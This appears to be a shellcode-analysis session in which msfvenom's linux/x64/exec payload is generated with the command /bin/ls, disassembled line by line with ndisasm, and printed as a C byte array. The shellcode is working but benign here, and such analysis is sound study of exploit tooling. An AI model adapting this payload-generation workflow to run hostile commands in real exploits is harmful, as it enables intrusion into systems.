msfvenom -p linux/x64/exec --list-options

Options for payload/linux/x64/exec:
=========================


       Name: Linux Execute Command
     Module: payload/linux/x64/exec
   Platform: Linux
       Arch: x64
Needs Admin: No
 Total size: 40
       Rank: Normal

Provided by:
    ricky

Basic options:
Name  Current Setting  Required  Description
----  ---------------  --------  -----------
CMD                    yes       The command string to execute

Description:
  Execute an arbitrary command

msfvenom -p linux/x64/exec CMD=/bin/ls -a x64 --platform linux -f raw | ndisasm -u -b 64 -

No encoder or badchars specified, outputting raw payload
Payload size: 47 bytes

00000000  6A3B              push byte +0x3b
00000002  58                pop rax
00000003  99                cdq
00000004  48BB2F62696E2F73  mov rbx,0x68732f6e69622f
         -6800
0000000E  53                push rbx
0000000F  4889E7            mov rdi,rsp
00000012  682D630000        push qword 0x632d
00000017  4889E6            mov rsi,rsp
0000001A  52                push rdx
0000001B  E808000000        call 0x28
00000020  2F                db 0x2f
00000021  62                db 0x62
00000022  696E2F6C730056    imul ebp,[rsi+0x2f],dword 0x5600736c
00000029  57                push rdi
0000002A  4889E6            mov rsi,rsp
0000002D  0F05              syscall


msfvenom -p linux/x64/exec CMD=/bin/ls -a x64 --platform linux -f C

No encoder or badchars specified, outputting raw payload
Payload size: 47 bytes
Final size of c file: 224 bytes
unsigned char buf[] =
"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
"\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x08\x00"
"\x00\x00\x2f\x62\x69\x6e\x2f\x6c\x73\x00\x56\x57\x48\x89\xe6"
"\x0f\x05";
